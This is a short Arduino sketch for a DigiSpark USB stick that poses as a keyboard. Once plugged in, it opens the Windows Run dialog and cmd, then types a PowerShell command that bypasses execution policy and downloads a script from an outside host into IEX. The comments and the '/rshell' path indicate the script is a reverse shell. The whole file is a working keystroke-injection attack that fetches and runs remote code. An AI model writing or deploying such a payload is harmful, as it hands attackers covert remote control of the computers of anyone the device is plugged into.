//This script requests a PowerShell payload from an http(s) server pipes it to IEX 
//I edited a template from https://github.com/CedArctic/DigiSpark-Scripts/ to make this.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2300);
  DigiKeyboard.print(F("powershell -NoP -ep Bypass \" irm -Uri https://t3l3machus.com:443/rshell | iex\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ }
}
